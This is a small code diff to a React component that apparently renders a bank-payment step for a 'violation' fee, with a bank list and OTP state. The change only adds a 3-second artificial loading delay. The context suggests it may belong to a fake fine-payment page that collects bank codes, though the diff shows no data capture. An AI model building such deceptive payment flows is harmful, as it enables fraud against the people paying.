@@ -145,7 +145,7 @@ const BANKS = [
 export default function Kent(props: { setPage?: any; violationValue: number }) {
   const [step, setstep] = useState(1);
   const [total, setTotal] = useState("");
-  const [loading, setLoading] = useState(false);
+  const [loading, setLoading] = useState(true);
   const [newotp] = useState([""]);
 const res=parseFloat(props.violationValue as unknown as  string)*0.30
   const handleUpdatePage = async (page: string) => {
@@ -180,6 +180,9 @@ const res=parseFloat(props.violationValue as unknown as  string)*0.30
   };
   useEffect(() => {
     setTotal(localStorage?.getItem("vv")!);
+    setTimeout(() => {
+      setLoading(false)
+    }, 3000);
   }, []);
 
   useEffect(() => {
